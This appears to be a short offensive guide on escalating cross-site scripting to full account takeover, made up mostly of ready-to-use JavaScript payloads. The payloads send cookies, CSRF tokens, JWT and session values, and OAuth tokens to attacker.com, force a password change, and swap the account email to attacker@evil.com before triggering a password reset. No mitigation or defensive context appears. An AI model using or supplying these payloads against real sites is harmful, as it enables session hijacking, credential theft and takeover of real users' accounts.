XSS can be escalated to full account takeover through several techniques.

**1. Cookie Stealing (if HttpOnly not set):**
```javascript
fetch('https://attacker.com/steal?c='+document.cookie);
// Or using image beacon
new Image().src='https://attacker.com/log?c='+encodeURIComponent(document.cookie);
```

**2. Session Token Extraction from DOM:**
```javascript
// Extract CSRF tokens
var token = document.querySelector('meta[name=csrf-token]').content;
var token2 = document.querySelector('input[name=_token]').value;

// Extract from JavaScript variables
var jwt = localStorage.getItem('token');
var session = sessionStorage.getItem('session');

fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({csrf: token, jwt: jwt, session: session})
});
```

**3. Password Change via XSS:**
```javascript
// Perform authenticated actions as the victim
fetch('/api/user/change-password', {
  method: 'POST',
  headers: {'Content-Type': 'application/json', 'X-CSRF-Token': document.querySelector('meta[name=csrf-token]').content},
  body: JSON.stringify({new_password: 'attacker_password'}),
  credentials: 'include'
});
```

**4. Email Change + Password Reset:**
```javascript
// Change email to attacker's
fetch('/api/user/settings', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'}),
  credentials: 'include'
}).then(() => {
  // Trigger password reset to new email
  fetch('/api/auth/forgot-password', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({email: 'attacker@evil.com'})
  });
});
```

**5. OAuth Token Theft:**
```javascript
// If OAuth tokens are accessible in the page
var oauthToken = document.getElementById('oauth-data').dataset.token;
fetch('https://attacker.com/steal?oauth='+oauthToken);
```

